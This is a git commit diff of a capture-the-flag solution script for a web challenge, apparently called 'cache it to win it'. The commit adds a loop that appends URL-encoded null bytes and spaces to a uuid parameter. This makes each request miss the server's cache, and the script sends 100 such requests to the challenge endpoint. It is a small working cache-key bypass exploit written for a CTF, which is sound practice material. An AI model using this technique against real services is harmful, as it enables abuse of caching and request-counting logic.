b1b110e578e04b1e970e54926dbc6a64dd1e1e3f
Metjuas <olexa.matej@gmail.com>
2025-02-09 11:41:17 +0100

    🔥 Fixed chache it to win it challenge

--- cache_it_to_win_it!/solution.py
+++ cache_it_to_win_it!/solution.py
@@ -1,8 +1,24 @@
 import requests
-# 4ef4332c-3bf4-4c4b-a88a-fecfe9cee647
-uuid = '4ef4332c-3bf4-4c4b-a88a-fecfe9cee647'
-url = 'https://cache-it-to-win-it.chall.lac.tf/check?uuid=' + uuid
-response = requests.get(url)
 
-print(response.status_code)
-print(response.text)
+def generate_combination(i):
+    binary_str = bin(i)[2:] 
+    combination = ''
+    for bit in binary_str:
+        if bit == '0':
+            combination += '%00'
+        else:
+            combination += '%20'
+    return combination
+
+def main():
+    uuid = '4ef4332c-3bf4-4c4b-a88a-fecfe9cee647'
+    url = 'https://cache-it-to-win-it.chall.lac.tf/check?uuid=' + uuid
+
+    for i in range(100):
+        new_url = url + generate_combination(i)
+        response = requests.get(new_url)
+        print(response.status_code)
+        print(response.text)
+
+if __name__ == "__main__":
+    main()
